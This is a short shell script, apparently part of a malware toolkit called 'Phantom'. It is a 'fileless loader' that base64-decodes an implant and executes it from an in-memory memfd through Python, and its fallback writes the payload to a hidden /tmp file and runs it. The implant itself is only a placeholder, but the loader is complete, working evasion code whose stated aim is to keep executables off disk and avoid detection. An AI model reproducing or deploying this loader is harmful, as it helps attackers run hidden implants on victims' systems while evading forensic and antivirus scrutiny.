#!/bin/sh
# Phantom fileless loader — runs the implant from an anonymous memfd.
# No executable is written to disk; it lives only in RAM.
set -e
B64="__B64__"

if command -v python3 >/dev/null 2>&1; then
  exec python3 - "$B64" <<'PY'
import os, base64, sys
b = base64.b64decode(sys.argv[1])
fd = os.memfd_create("phantom", 0)
os.write(fd, b)
os.fchmod(fd, 0o755)
os.set_inheritable(fd, True)
os.execve("/proc/self/fd/%d" % fd, ["phantom"], os.environ)
PY
else
  TMP="${TMPDIR:-/tmp}/.phantom_$$"
  printf '%s' "$B64" | base64 -d > "$TMP"
  chmod +x "$TMP"
  exec "$TMP"
fi